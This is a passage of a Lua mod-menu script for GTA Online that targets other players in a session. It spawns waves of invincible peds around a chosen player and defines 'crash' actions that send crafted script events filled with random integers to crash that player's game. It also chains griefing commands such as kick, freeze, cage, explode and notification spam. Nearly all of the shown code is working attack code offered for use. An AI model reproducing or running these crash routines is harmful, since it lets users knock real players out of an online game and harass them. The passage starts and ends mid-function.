                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds12[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds12[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lamardavis")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds13 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds13[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds13[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds13[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds13[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds13[i], 3, 2, 3, 0 )
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds13[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lestercrest")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds14 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds14[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds14[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds14[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds14[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds14[i], 11, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds14[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lestercrest_3")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds15 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds15[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds15[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds15[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds15[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds15[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds15[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_martinmadrazo")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds16 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds16[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds16[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds16[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds16[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds16[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds16[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_milton")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds17 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds17[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds17[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds17[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds17[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds17[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds17[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_molly")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds18 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds18[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds18[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds18[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds18[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds18[i], 4, 1, 3, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds18[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_mrs_thornhill")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds19 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds19[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds19[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds19[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds19[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds19[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds19[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_nigel")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds20 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds20[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds20[i])
                    util.yield(5)					
                end
                util.yield(100)
                util.toast("Done")
            else
                util.toast("You can't use it on yourself")
            end
    end)

    local bozocrash = menu.list(crash, "Bozo Deleter Crash", {}, "")

menu.action(bozocrash, "Bozo Deleter Crash", {"bozocrash"}, "Sends a really strong crash coded by Mr.Pro.", function()
        notification("Bozo Deleter Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                local int_min = -2147483647
                local int_max = 2147483647
                    for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778, math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                    end
                    util.yield()
                    for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
                    end
            menu.trigger_commands("givesh" .. players.get_name(pid))
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
        notification("Bozo deleter sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                end)

menu.toggle_loop(bozocrash, "Bozo Deleter Crash", {"togglebozocrash"}, "Sends a really strong crash coded by Mr.Pro.", function(on_toggle)
        notification("Bozo Deleter Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                local int_min = -2147483647
                local int_max = 2147483647
                    for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778, math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                    end
                    util.yield()
                    for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
                    end
            menu.trigger_commands("givesh" .. players.get_name(pid))
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
        notification("Bozo deleter sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                end)

    local secrash = menu.list(crash, "SE Crash", {}, "")

    	menu.action(secrash, "SE Crash", {"skidpow"}, "", function()
    	notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("SE Crash " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    	menu.toggle_loop(secrash, "SE Crash", {"toggleskidpow"}, "", function(on_toggle)
    	notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("Skid Crashed " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)



    local automobcrash = menu.list(crash, "Automobile Crash", {}, "")

    	menu.action(automobcrash, "Automobile Crash", {"automob"}, "Sends ped's and automobiles causing (S0) events. Blocked by most popular menus.", function()
    	notification("Automobile Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("Automobile Crash Sent To " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    	menu.toggle_loop(automobcrash, "Automobile Crash", {"toggleautomob"}, "Sends ped's and automobiles causing (S0) events. Blocked by most popular menus.", function(on_toggle)
    	notification("Automobile Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("Automobile Crash Sent To " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)


    local tehecrash = menu.list(crash, "Teheh Crash", {}, "")
 
    	menu.action(tehecrash, "Teheh Crash", {"tehe"}, "Stand crashes and trolls all in 1 (Laggy).", function()
    	notification("Teheheh sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("bounty".. players.get_name(pid) .. " 10000")
	menu.trigger_commands("ceokick" .. players.get_name(pid))
	menu.trigger_commands("mugloop" .. players.get_name(pid))
	menu.trigger_commands("ring" .. players.get_name(pid))
	menu.trigger_commands("freeze" .. players.get_name(pid))
	menu.trigger_commands("confuse" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("notifyspam"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("casinotp"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("mission"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("error"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ring"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("cage"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("mugloop"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("crash".. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(pid))
                  menu.trigger_commands("steamroll" .. players.get_name(pid))
	menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("notifyspam" .. players.get_name(pid))
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
